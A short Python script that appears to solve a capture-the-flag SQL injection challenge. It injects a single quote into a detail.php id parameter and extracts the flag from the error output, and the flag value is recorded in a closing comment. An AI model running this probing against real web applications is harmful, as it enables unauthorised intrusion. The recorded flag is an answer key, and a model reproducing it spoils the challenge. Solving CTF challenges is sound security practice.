import requests
import re

BASE_URL = "http://gzcli.1pc.tf:40731/"
ENDPOINT_WITH_SQL = "detail.php?id="

NORMAL_SQL = "1"
normal_res = requests.get(BASE_URL + ENDPOINT_WITH_SQL + NORMAL_SQL)
print(normal_res.text)

print("=" * 50)

TRIGGER_ERROR = "'"
error_res = requests.get(BASE_URL + ENDPOINT_WITH_SQL + TRIGGER_ERROR)
print(error_res.text)

print("=" * 50)

flag_format = "MBPTL-5{.*}"
flag = re.search(flag_format, error_res.text)[0]
print(flag)

# MBPTL-5{ecfccdccc915eec43cfbcca2d0489204}